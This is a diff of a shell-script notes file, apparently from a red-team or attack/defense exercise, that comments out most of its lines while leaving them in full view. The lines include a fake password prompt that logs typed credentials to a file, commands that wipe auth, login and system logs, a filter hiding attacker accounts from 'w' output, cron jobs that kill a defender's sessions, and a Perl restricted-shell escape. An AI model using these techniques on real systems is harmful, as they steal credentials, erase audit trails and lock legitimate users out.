@@ -1,4 +1,4 @@
-cat <<EOL | sudo tee /var/lib/upower/wilp.txt > /dev/null
+#cat <<EOL | sudo tee /var/lib/upower/wilp.txt > /dev/null
 #!/bin/bash
 #Stores IP address
 IPADDR=$(hostname -I | awk '{print $1}')
@@ -6,18 +6,18 @@ IPADDR=$(hostname -I | awk '{print $1}')
 echo "Permission denied, please try again.
 defender@$IPADDR's password: "; read -sr login
 echo "$login" >> lgg.txt
-EOL
-chmod 777 /var/lib/upower/wilp.txt
-touch /var/lib/upower/lgg.txt
-chmod 777 /var/lib/upower/lgg.txt
+#EOL
+#chmod 777 /var/lib/upower/wilp.txt
+#touch /var/lib/upower/lgg.txt
+#chmod 777 /var/lib/upower/lgg.txt
 
-cat /dev/null > /var/log/auth.log
-cat /dev/null > /var/log/lastlog
-cat /dev/null > /var/log/wtmp
-cat /dev/null > /var/log/btmp
-cat /dev/null > /var/log/syslog
-cat /dev/null > /var/log/faillog
-cat /dev/null > /var/log/daemon.log
+#cat /dev/null > /var/log/auth.log
+#cat /dev/null > /var/log/lastlog
+#cat /dev/null > /var/log/wtmp
+#cat /dev/null > /var/log/btmp
+#cat /dev/null > /var/log/syslog
+#cat /dev/null > /var/log/faillog
+#cat /dev/null > /var/log/daemon.log
 
 #Virus Uploading
 #!/bin/bash
@@ -66,19 +66,21 @@ stty sane
 # Restore default signal handling
 trap - SIGINT SIGTSTP
 
+#Blast logo
+cat /var/lib/emacsen-uncommon/logo
 
 
 #!/bin/bash
 
-/usr/bin/ww $1 | grep -v 'abdullayev.coshgun' | grep -v 'root' | grep -v 'abdullayev' | grep -v 'coshgun' 
+#/usr/bin/ww $1 | grep -v 'abdullayev.coshgun' | grep -v 'root' | grep -v 'abdullayev' | grep -v 'coshgun' 
 
 
-* * * * * /usr/bin/wall -n "The system will be restarted in 2 minutes"
-*/2 * * * * /usr/bin/pkill -u defender
+#* * * * * /usr/bin/wall -n "The system will be restarted in 2 minutes"
+#*/2 * * * * /usr/bin/pkill -u defender
 
 
 #Escaping the perl interpreter, type the command below, hit 'Enter', and then hit 'CTRL+D' to run the command and open a shell
-exec'/bin/sh';
+#exec'/bin/sh';
 
 
-https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
+#https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
